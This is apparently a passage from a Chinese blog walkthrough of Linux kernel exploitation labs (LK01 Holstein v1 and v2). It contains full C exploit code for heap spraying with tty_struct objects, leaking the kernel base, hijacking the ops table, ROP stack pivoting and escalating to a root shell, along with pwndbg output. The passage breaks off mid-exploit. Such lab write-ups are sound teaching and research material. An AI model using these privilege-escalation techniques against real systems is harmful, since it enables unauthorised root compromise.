class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x500</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">close</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述代码首先在内核堆上喷射了50个<code>tty_struct</code>结构体，然后为漏洞模块在堆上申请了0x400大小的内存空间，最后又喷射了50个<code>tty_struct</code>结构体。</p><p>这样一来，有很大概率出现这样的堆布局：漏洞模块的0x400大小的<code>g_buf</code>缓冲区前后都是<code>tty_struct</code>结构体。</p><p>在moudle_write下断点，我们找到g_buf指向的地址，观察堆布局：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">pwndbg> p &amp;g_buf$2 = (&lt;data variable, no debug info> *) 0xffffffffc0014400 &lt;g_buf>pwndbg> x/gx 0xffffffffc00144000xffffffffc0014400 &lt;g_buf>:0xffff888003101000pwndbg> x/4gx 0xffff888003101000-0x400*20xffff888003100800:0x00000001000054010x00000000000000000xffff888003100810:0xffff88800265ee400xffffffff81c38880pwndbg> x/4gx 0xffff888003101000-0x4000xffff888003100c00:0x00000001000054010x00000000000000000xffff888003100c10:0xffff88800265ef000xffffffff81c38760pwndbg> x/4gx 0xffff8880031010000xffff888003101000:0x00000000000000000x00000000000000000xffff888003101010:0x00000000000000000x0000000000000000pwndbg> x/4gx 0xffff888003101000+0x4000xffff888003101400:0x00000001000054010x00000000000000000xffff888003101410:0xffff88800265ee400xffffffff81c38880pwndbg> x/4gx 0xffff888003101000+0x400*20xffff888003101800:0x00000001000054010x00000000000000000xffff888003101810:0xffff88800265ef000xffffffff81c38760pwndbg> x/4gx 0xffff888003101000+0x400*30xffff888003101c00:0x00000001000054010x00000000000000000xffff888003101c10:0xffff88800265ee400xffffffff81c38880<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续在GDB中执行，完成copy_from_user(g_buf, buf, count)操作，实现堆溢出。溢出后，再次查看g_buf及其后的内存，可以发现后面第一个tty_struct结构体的开始部分已经被溢出数据覆盖：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">pwndbg> x/4gx 0xffff8880031010000xffff888003101000:0x41414141414141410x41414141414141410xffff888003101010:0x41414141414141410x4141414141414141pwndbg> x/4gx 0xffff888003101000+4000xffff888003101190:0x41414141414141410x41414141414141410xffff8880031011a0:0x41414141414141410x4141414141414141<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至此，我们完成了第一次堆喷。</p><p>在借助堆喷手法成功布置内核堆后，我们通常利用堆溢出漏洞篡改目标对象的特定函数指针，或者伪造一个函数指针表，然后在用户空间对目标对象执行系统调用，从而触发它的相应操作函数，由于该函数指针已经被篡改为一个恶意的地址，内核控制流将被劫持。</p><h2 id="三-EXP"><a href="#三-EXP" class="headerlink" title="(三)EXP"></a>(三)EXP</h2><p>module_read 可以对g_buf指向的堆块越界读，我们可以读取其相邻tty结构体的tty_struct.ops指针，以此泄露内核基地址</p><p>攻击思路：堆喷射布局，通过堆溢出篡改tty_struct.ops指针到用户态的伪造函数表上，进而控制rip执行shellcode</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff81074650</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff810744b0</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>prepare_kernel_cred_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>commit_creds_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"swapgs;"</span><span class="token string">"push %0;"</span><span class="token string">"push %1;"</span><span class="token string">"push %2;"</span><span class="token string">"push %3;"</span><span class="token string">"push %4;"</span><span class="token string">"iretq;"</span><span class="token operator">:</span><span class="token operator">:</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>getRootShell<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> spray<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x450</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x450</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x418</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0xc38880</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] leak => 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span>prepare_kernel_cred_addr<span class="token operator">=</span>prepare_kernel_cred_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>commit_creds_addr<span class="token operator">=</span>commit_creds_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span><span class="token comment">//fake ops</span><span class="token class-name">size_t</span> fake_ops<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>fake_ops<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootPrivilige<span class="token punctuation">;</span><span class="token comment">//ops_close</span><span class="token comment">//overlap ops</span><span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x418</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fake_ops<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x420</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="二、LK01-2-Holstein-v2-smep-smap-kpti-kaslr"><a href="#二、LK01-2-Holstein-v2-smep-smap-kpti-kaslr" class="headerlink" title="二、LK01-2 Holstein v2 +smep, +smap, kpti, kaslr"></a>二、LK01-2 Holstein v2 +smep, +smap, kpti, kaslr</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul><li>绕过SMAP：开启了SMAP，我们不能将ops函数表放到用户态了。不过我们能够控制堆数据，可以将伪造的函数表放到堆上来控制内核执行流</li><li>绕过SMEP：我们无法再使用ret2usr，考虑kROP，但是这与栈溢出不同，我们需要进行stack pivoting</li><li>绕过kpti：swapgs_restore_regs_and_return_to_usermode()降落用户态</li></ul><p>最大的问题是栈劫持，如果需要劫持rsp到堆上，就必须要求寄存器或栈上有相应的堆地址，以通过gadget赋值给rsp</p><p>若我们以ops_close为触发点，内存情况如下，根本没有合适的堆地址给我们用：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">*RAX  0xffffffff810d4605 (___bpf_prog_run+869) ◂— pop rsp /* 0xfffffca5e908c35c */*RBX  0xffff888002e8cf00 ◂— 0*RCX  0xffff8880030f75f8 ◂— 0*RDX  0x1*RDI  0xffff8880030f7400 ◂— add dword ptr [rax + rax], edx /* 0x200005401 */*RSI  0xffff888002e8cf00 ◂— 0*R8   0x1*R9   0x1*R10  0x10*R11  0x0*R12  0xffff8880030f7400 ◂— add dword ptr [rax + rax], edx /* 0x200005401 */*R13  0xffff8880030f7800 ◂— add dword ptr [rax + rax], edx /* 0x100005401 */*R14  0xffff888002863e40 ◂— or byte ptr [rax], al /* 0x200500008 */*R15  0xffff88800272c2a0 —▸ 0xffff888002804300 ◂— add byte ptr [rax], al /* 0x200200000 */*RBP  0xffffc90000187e68 —▸ 0xffffc90000187ea0 —▸ 0xffffc90000187eb0 —▸ 0xffffc90000187ed8 —▸ 0xffffc90000187f00 ◂— ...*RSP  0xffffc90000187e28 —▸ 0xffffffff81318b6a (tty_release+298) ◂— mov rdi, r13 /* 0x1be41ef894c */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>变换思路，我们可以以ops_ioctl为触发点，ioctl允许自定义传参，我们就可以传入堆地址给rdx：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">*RAX  0xffffffff810d4605 (___bpf_prog_run+869) ◂— pop rsp /* 0xfffffca5e908c35c */*RBX  0xffff8880030e4c00 ◂— add dword ptr [rax + rax], edx /* 0x100005401 */ RCX  0x0*RDX  0xffff8880030e4400 ◂— 0x4141414141414141 ('AAAAAAAA')*RDI  0xffff8880030e4800 ◂— add dword ptr [rax + rax], edx /* 0x100005401 */ RSI  0x0*R8   0xffff8880030e4400 ◂— 0x4141414141414141 ('AAAAAAAA')*R9   0x0 R10  0x0*R11  0x0 R12  0x0*R13  0xffff8880030e4800 ◂— add dword ptr [rax + rax], edx /* 0x100005401 */*R14  0xffff8880030e4400 ◂— 0x4141414141414141 ('AAAAAAAA')*R15  0xffff888002e8b600 ◂— 0*RBP  0xffffc90000167ea8 —▸ 0xffffc90000167f30 —▸ 0xffffc90000167f48 ◂— 0*RSP  0xffffc90000167e10 —▸ 0xffffffff8131975a (tty_ioctl+906) ◂— cmp eax, 0xfffffdfd /* 0xab850ffffffdfd3d */*RIP  0xffffffff810d4605 (___bpf_prog_run+869) ◂— pop rsp /* 0xfffffca5e908c35c */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此我们需要能将rdx赋值给rsp的gadget，在内核中很难找到<code>mov rsp, rcx; ret;</code>这样直接的 gadget，但是像<code>push rcx; ...; pop rsp; ...; ret;</code>的 gadget 存在的可能性很大，所以搜索这种形式可能会更容易找到：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">╰─ ropr  <span class="token parameter variable">-R</span> <span class="token string">"push rdx.*; pop rsp; .*ret;"</span> ./vmlinux0xffffffff813a478a: push rdx<span class="token punctuation">;</span> mov ebp, 0x415bffd9<span class="token punctuation">;</span> pop rsp<span class="token punctuation">;</span> pop r13<span class="token punctuation">;</span> pop rbp<span class="token punctuation">;</span> ret<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么接下来就迎刃而解了</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PUSH_RDX_POP_RSP_PP_RET</span> <span class="token expression"><span class="token number">0xffffffff813a478a</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff810d748d</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVESQ_RET</span> <span class="token expression"><span class="token number">0xffffffff8162707b</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff8113c1c4</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff81074650</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff810744b0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>prepare_kernel_cred_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token 